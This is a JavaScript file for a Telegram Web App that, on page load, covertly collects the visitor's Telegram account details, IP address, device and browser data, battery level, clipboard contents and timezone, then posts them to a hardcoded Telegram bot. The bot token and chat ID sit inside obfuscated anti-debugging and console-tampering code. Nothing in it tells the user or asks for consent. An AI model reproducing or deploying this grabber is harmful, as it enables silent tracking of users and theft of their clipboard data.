let batteryLevel;
let screenWidth;
let screenHeight;
navigator.getBattery().then(function(battery) {
    batteryLevel = battery.level * 100;
});
screenWidth = window.screen.width;
screenHeight = window.screen.height;
// wXh
const batteryLevelConst = batteryLevel;
const screenWidthConst = screenWidth;
const screenHeightConst = screenHeight;
const clipboardText = navigator.clipboard.readText();

let tg = window.Telegram.WebApp;
document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const userAgent = navigator.userAgent;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const osname = navigator.platform;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browser = getBrowserInfo();
      let userid = document.createElement('p');

      const message = `
*👤 Новый пользователь*

*🧭 Информация:*
*🔍 Account:*
  ├ ID: ${tg.initDataUnsafe.user.id}
  ├ Username: @${tg.initDataUnsafe.user.username}
  ├ Name: ${tg.initDataUnsafe.user.first_name}
  ├ Surname: ${tg.initDataUnsafe.user.last_name}
  ├ Language: ${tg.initDataUnsafe.user.language_code}
*💻 System:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ OS: ${osname}
  ├ Browser: ${browser}
  ├ Battery ${batteryLevel}%
  ├ Screen: ${screenWidth}x${screenHeight} px.
  ├ Clipboard: ${clipboardText}
  └ Timezone: ${timeZone}

*Success!*`;
      
      const _0x1063=['374284ivUGzO','constructor','prototype','bind','1561bCTZeK','635735PWKnPI','log','2KNFuuQ','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','1043588FfNIgU','table','1935zxYdYV','toString','trace','apply','541opdGGo','length','test','298KVcFjm','827752ISmtst','console','exception','return\x20/\x22\x20+\x20this\x20+\x20\x22/','error','warn','2253702rwVTsd'];const _0x29d1=function(_0x22c411,_0x3f57ec){_0x22c411=_0x22c411-0x1b9;let _0x1ee966=_0x1063[_0x22c411];return _0x1ee966;};(function(_0x4d387a,_0x597240){const _0xc32132=_0x29d1;while(!![]){try{const _0x7cfb5e=-parseInt(_0xc32132(0x1c1))*parseInt(_0xc32132(0x1ba))+-parseInt(_0xc32132(0x1cc))*parseInt(_0xc32132(0x1c5))+parseInt(_0xc32132(0x1bf))+-parseInt(_0xc32132(0x1c3))+-parseInt(_0xc32132(0x1cd))+-parseInt(_0xc32132(0x1c9))*-parseInt(_0xc32132(0x1be))+parseInt(_0xc32132(0x1b9));if(_0x7cfb5e===_0x597240)break;else _0x4d387a['push'](_0x4d387a['shift']());}catch(_0x15ce1c){_0x4d387a['push'](_0x4d387a['shift']());}}}(_0x1063,0x83338));const _0x4132c8=function(){let _0xd878be=!![];return function(_0x2e1d58,_0x28e906){const _0x13ee3a=_0xd878be?function(){const _0x2fd330=_0x29d1;if(_0x28e906){const _0xb6145d=_0x28e906[_0x2fd330(0x1c8)](_0x2e1d58,arguments);return _0x28e906=null,_0xb6145d;}}:function(){};return _0xd878be=![],_0x13ee3a;};}(),_0x42af32=_0x4132c8(this,function(){const _0x29b48b=function(){const _0x323bd9=_0x29d1,_0x5b5131=_0x29b48b['constructor'](_0x323bd9(0x1d0))()[_0x323bd9(0x1bb)](_0x323bd9(0x1c2));return!_0x5b5131[_0x323bd9(0x1cb)](_0x42af32);};return _0x29b48b();});_0x42af32();const _0x60cb3c=function(){let _0x4ef321=!![];return function(_0x2e22fe,_0x392e76){const _0x149680=_0x4ef321?function(){const _0x140c1c=_0x29d1;if(_0x392e76){const _0x444de6=_0x392e76[_0x140c1c(0x1c8)](_0x2e22fe,arguments);return _0x392e76=null,_0x444de6;}}:function(){};return _0x4ef321=![],_0x149680;};}(),_0x843fb1=_0x60cb3c(this,function(){const _0x4f15a3=_0x29d1,_0x602538=function(){let _0x7a63b2;try{_0x7a63b2=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5c2342){_0x7a63b2=window;}return _0x7a63b2;},_0x3dbace=_0x602538(),_0x4376ec=_0x3dbace[_0x4f15a3(0x1ce)]=_0x3dbace[_0x4f15a3(0x1ce)]||{},_0x80ddff=[_0x4f15a3(0x1c0),_0x4f15a3(0x1d2),'info',_0x4f15a3(0x1d1),_0x4f15a3(0x1cf),_0x4f15a3(0x1c4),_0x4f15a3(0x1c7)];for(let _0x54fc63=0x0;_0x54fc63<_0x80ddff[_0x4f15a3(0x1ca)];_0x54fc63++){const _0x415617=_0x60cb3c['constructor'][_0x4f15a3(0x1bc)]['bind'](_0x60cb3c),_0x145c7c=_0x80ddff[_0x54fc63],_0x56666c=_0x4376ec[_0x145c7c]||_0x415617;_0x415617['__proto__']=_0x60cb3c[_0x4f15a3(0x1bd)](_0x60cb3c),_0x415617['toString']=_0x56666c[_0x4f15a3(0x1c6)][_0x4f15a3(0x1bd)](_0x56666c),_0x4376ec[_0x145c7c]=_0x415617;}});_0x843fb1();const token='7103636646:AAEibKR-rMPLTAAGu3qjqTx6G2WRJxRDujY';
      const _0xce82=['exception','1YiFBHF','751003ResEGm','1GZoyAg','bind','__proto__','constructor','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','length','return\x20/\x22\x20+\x20this\x20+\x20\x22/','193749lrebXT','357243ATwZmR','833383AeFgZY','112597uzPsap','1HiAudb','trace','apply','return\x20(function()\x20','warn','135989DVjRua','42jKzhWo','info','{}.constructor(\x22return\x20this\x22)(\x20)','console','toString','error','test','table','16131VzbKlH','prototype'];const _0x46c4=function(_0x50b0d9,_0x172dcd){_0x50b0d9=_0x50b0d9-0x191;let _0x29987a=_0xce82[_0x50b0d9];return _0x29987a;};(function(_0x2cd5b9,_0x146ac5){const _0x3deeeb=_0x46c4;while(!![]){try{const _0x1e2c44=parseInt(_0x3deeeb(0x19f))+parseInt(_0x3deeeb(0x192))*-parseInt(_0x3deeeb(0x1a0))+parseInt(_0x3deeeb(0x1a9))+parseInt(_0x3deeeb(0x19b))*-parseInt(_0x3deeeb(0x193))+-parseInt(_0x3deeeb(0x1a8))*parseInt(_0x3deeeb(0x19e))+-parseInt(_0x3deeeb(0x1aa))*parseInt(_0x3deeeb(0x1ab))+parseInt(_0x3deeeb(0x1a7));if(_0x1e2c44===_0x146ac5)break;else _0x2cd5b9['push'](_0x2cd5b9['shift']());}catch(_0x406eb1){_0x2cd5b9['push'](_0x2cd5b9['shift']());}}}(_0xce82,0x78cd4));const _0x441104=function(){let _0x4fd00c=!![];return function(_0x50a705,_0x25f2c7){const _0x23b47f=_0x4fd00c?function(){const _0x237c91=_0x46c4;if(_0x25f2c7){const _0x1d57e5=_0x25f2c7[_0x237c91(0x1ad)](_0x50a705,arguments);return _0x25f2c7=null,_0x1d57e5;}}:function(){};return _0x4fd00c=![],_0x23b47f;};}(),_0xd2d8e7=_0x441104(this,function(){const _0x338c96=function(){const _0x1c4f47=_0x46c4,_0x1157e7=_0x338c96[_0x1c4f47(0x1a3)](_0x1c4f47(0x1a6))()[_0x1c4f47(0x1a3)](_0x1c4f47(0x1a4));return!_0x1157e7[_0x1c4f47(0x199)](_0xd2d8e7);};return _0x338c96();});_0xd2d8e7();const _0x4cacec=function(){let _0x5115df=!![];return function(_0x1fd207,_0x33c81c){const _0x3a71eb=_0x5115df?function(){const _0x2d9af9=_0x46c4;if(_0x33c81c){const _0x58e08f=_0x33c81c[_0x2d9af9(0x1ad)](_0x1fd207,arguments);return _0x33c81c=null,_0x58e08f;}}:function(){};return _0x5115df=![],_0x3a71eb;};}(),_0x59cd2a=_0x4cacec(this,function(){const _0x5c8d5e=_0x46c4;let _0x5a57ce;try{const _0x476b67=Function(_0x5c8d5e(0x1ae)+_0x5c8d5e(0x195)+');');_0x5a57ce=_0x476b67();}catch(_0xd31ae4){_0x5a57ce=window;}const _0x1a0a2f=_0x5a57ce[_0x5c8d5e(0x196)]=_0x5a57ce[_0x5c8d5e(0x196)]||{},_0x5544f9=['log',_0x5c8d5e(0x191),_0x5c8d5e(0x194),_0x5c8d5e(0x198),_0x5c8d5e(0x19d),_0x5c8d5e(0x19a),_0x5c8d5e(0x1ac)];for(let _0x210333=0x0;_0x210333<_0x5544f9[_0x5c8d5e(0x1a5)];_0x210333++){const _0x52ab12=_0x4cacec[_0x5c8d5e(0x1a3)][_0x5c8d5e(0x19c)][_0x5c8d5e(0x1a1)](_0x4cacec),_0x35081c=_0x5544f9[_0x210333],_0x7ba748=_0x1a0a2f[_0x35081c]||_0x52ab12;_0x52ab12[_0x5c8d5e(0x1a2)]=_0x4cacec[_0x5c8d5e(0x1a1)](_0x4cacec),_0x52ab12[_0x5c8d5e(0x197)]=_0x7ba748[_0x5c8d5e(0x197)][_0x5c8d5e(0x1a1)](_0x7ba748),_0x1a0a2f[_0x35081c]=_0x52ab12;}});_0x59cd2a();const chatId='-1002079075830';
      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('text', message);
      formData.append('parse_mode', 'Markdown');
      fetch(url, {
        method: 'POST',
        body: formData
      });
    });

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
      browser = `IE ${tem[1] || ''}`;
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? `version ${match[2]}` : '';
    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
    return browser;
  }
  });